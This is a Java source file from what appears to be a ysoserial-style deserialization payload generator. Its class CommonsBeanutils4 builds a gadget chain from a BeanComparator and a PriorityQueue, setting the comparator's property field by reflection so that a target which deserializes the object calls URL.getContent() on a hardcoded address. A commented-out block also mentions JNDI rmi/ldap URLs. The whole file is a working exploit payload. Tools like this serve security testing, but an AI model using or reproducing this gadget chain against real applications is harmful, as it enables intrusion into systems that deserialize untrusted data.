package me.gv7.woodpecker.yso.payloads;

import com.sun.rowset.JdbcRowSetImpl;
import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.custom.CustomCommand;
import me.gv7.woodpecker.yso.payloads.util.Gadgets;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import me.gv7.woodpecker.yso.payloads.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.net.URL;
import java.util.PriorityQueue;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF })
public class CommonsBeanutils4 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
//        String jndiURL = null;
//        if(command.toLowerCase().startsWith(CustomCommand.COMMAND_JNDI)){
//            jndiURL = command.substring(CustomCommand.COMMAND_JNDI.length());
//        }else{
//            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
//        }

        BeanComparator comparator = new BeanComparator("lowestSetBit");
        URL url = new URL("http://127.0.0.1:1664/xxxabx");
        url.getContent();
        PriorityQueue queue = new PriorityQueue(2, comparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        Reflections.setFieldValue(comparator, "property", "content");
        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = url;
        queueArray[1] = url;
		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils4.class, args);
	}
}
